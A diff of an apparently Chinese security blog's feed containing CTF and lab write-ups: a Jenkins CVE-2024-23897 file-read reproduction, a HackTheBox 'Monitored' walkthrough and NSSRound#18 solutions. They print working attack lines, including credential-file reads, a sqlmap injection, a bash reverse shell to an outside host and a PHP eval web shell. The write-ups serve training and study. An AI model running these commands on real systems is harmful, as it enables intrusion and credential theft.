-<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
-<p>总结一下就是：</p>
-<ul>
-<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
-<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
-</ul>
-<h2 id="如何读取想要的内容"><a href="#如何读取想要的内容" class="headerlink" title="如何读取想要的内容"></a>如何读取想要的内容</h2><p>前文已经知道了文件读取漏洞的原理，利用<code>jenkins-cli.jar</code>将命令传到服务端解析借助args4j库特性解析参数有<code>@</code>开头的文件</p>
-<p>要实现任意文件读取，那么就需要返回文件读取后的内容。利用点是如果调用命令行的时候出错，args4j就会把错误返回给客户端而错误信息中就包含文件的内容。</p>
-<p>这里p神提到，如果我们使用<code>@</code>将文件内容加载成命令行参数，那么我们读取文件的时候只能读到文件的前几行</p>
-<p>比如使用help命令能读取前两行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220700887.png"></p>
-<p>使用keep-build命令，可以读取文件第3行</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408220816201.png"></p>
-<p>读取几行内容终究是不够，前文提到如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括<code>connect-node</code>命令和<code>reload-job</code>命令。这俩命令可以用来读取文件全部内容</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408221213026.png"></p>
-<h2 id="Jenkins敏感文件"><a href="#Jenkins敏感文件" class="headerlink" title="Jenkins敏感文件"></a>Jenkins敏感文件</h2><p>如果部署Jenkins是Vulhub的Docker镜像，那么Jenkins的数据根目录是在<code>/var/jenkins_home</code>。但并不是所有人都会使用这个目录作为根目录，如果想读取Jenkins相关的文件，必须先知道Jenkins的根目录在哪里。这时可以读取<code>/proc/self/environ</code>也就是环境变量</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222401625.png"></p>
-<p>拿到了Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
-<ul>
-<li><code>/var/jenkins_home/users/*/config.xml</code> 保存所有用户的信息，包括密码、种子、Token等</li>
-<li><code>/var/jenkins_home/secret.key</code> 保存Remember-Me Cookie中的一部分</li>
-<li><code>/var/jenkins_home/secrets/master.key</code> 作为AES解密密钥</li>
-<li><code>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac</code> 作为计算hmac签名时的Key</li>
-</ul>
-<h3 id="读取用户密码"><a href="#读取用户密码" class="headerlink" title="读取用户密码"></a>读取用户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/users.xml&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>管理信息库MIB</strong></p>
+<blockquote>
+<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
+</blockquote>
+<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
+<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>
 
-<p>得到用户名<code>admin_6382705393240952219</code></p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222722527.png"></p>
-<p>接着读取到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://localhost:8080/ -http reload-job &quot;@/var/jenkins_home/users/admin_6382705393240952219/config.xml&quot;</span><br></pre></td></tr></table></figure>
+<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
+<p>回到题目，用snmpwalk进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408222813856.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>跟着p神复现热门漏洞可以说是非常有收获，c1oudfl0w0师傅说RWCTF2024有道题考的就是这个漏洞，可惜当时没去打hhh</p>
+<p>注：这里版本应该都能扫出来</p>
+<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
+<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
+<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
+<p>不过登陆失败</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
+<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
+<p>成功登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
+<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
+<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
+<p>当然在文章中我们注意到成功需要知道cookie值</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
+<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
+<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
+<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
+<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p>得到admin的api后，添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
+<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
+<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
+<p>尝试sudo提权</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
+<p>试试<code>manage_services.sh</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>
+
+<p>执行后提示需要有参数，随便加一个status</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
+<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
+<p>我们先停止npcd服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
+<p>使用wget命令下载我们的npcd文件，赋予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
+<p>然后开启<code>npcd</code>服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>
+
+<p>成功提权拿到root的flag</p>
 ]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>渗透</category>
       </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
   </entry>
   <entry>
     <title>Logjammer</title>
@@ -1644,112 +1752,67 @@
       </tags>
   </entry>
   <entry>
-    <title>Monitored</title>
-    <url>/article/Monitored-HackTheBox.html</url>
-    <content><![CDATA[<p>snmp协议</p>
+    <title>NSSRound#18 Basic</title>
+    <url>/article/NSSRound-18-Basic.html</url>
+    <content><![CDATA[<p>session伪造、perl_startup提权</p>
 <span id="more"></span>
 
-<h1 id="Monitored"><a href="#Monitored" class="headerlink" title="Monitored"></a>Monitored</h1><p><strong>信息搜集</strong></p>
-<p>nmap扫描一下端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>
+<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
+<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
+<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
+<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
-<p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>
+<p>大概就是对评论的图片链接格式的过滤</p>
+<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
-<p>继续访问发现是登陆界面</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
-<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
+<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>
 
-<p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
+<p>成功跳转元梦之星</p>
+<p>然后就是如何给门酱一个链接</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
+<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
+<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
+<p>拼接上题目路径即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>
 
-<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
-<p><strong>SNMP</strong></p>
-<blockquote>
-<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
-</blockquote>
-<p><strong>管理信息库MIB</strong></p>
-<blockquote>
-<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
-</blockquote>
-<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
-<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
+<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
+<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
+<p>我们bp抓包，构造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
-<p>回到题目，用snmpwalk进行扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>
 
-<p>注：这里版本应该都能扫出来</p>
-<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
-<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
-<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
-<p>不过登陆失败</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
-<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
-<p>成功登录</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
-<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
-<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
-<p>当然在文章中我们注意到成功需要知道cookie值</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
-<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
-<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
-<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
-<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
+<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
+<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
+<p>搜出来<code>CVE-2021-3156</code></p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
+<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>得到admin的api后，添加用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>
-
-<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
-<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
-<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
-<p>成功反弹shell</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
-<p>尝试sudo提权</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
-<p>试试<code>manage_services.sh</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>
-
-<p>执行后提示需要有参数，随便加一个status</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
-<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
-<p>我们先停止npcd服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
-<p>使用wget命令下载我们的npcd文件，赋予权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
-<p>然后开启<code>npcd</code>服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>
-
-<p>成功提权拿到root的flag</p>
+<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
+<p>上传成功</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
+<p>然后再nc连接，成功提权</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
+<p>得到flag</p>
+<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>CTF比赛</category>
       </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
   </entry>
   <entry>
     <title>NKCTF 2024</title>
@@ -1827,69 +1890,6 @@
       <tags>
         <tag>CMS</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>NSSRound#18 Basic</title>
-    <url>/article/NSSRound-18-Basic.html</url>
-    <content><![CDATA[<p>session伪造、perl_startup提权</p>
-<span id="more"></span>
-
-<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
-<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
-<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
-<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>大概就是对评论的图片链接格式的过滤</p>
-<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
-<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
-<p>成功跳转元梦之星</p>
-<p>然后就是如何给门酱一个链接</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
-<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
-<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
-<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
-<p>拼接上题目路径即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
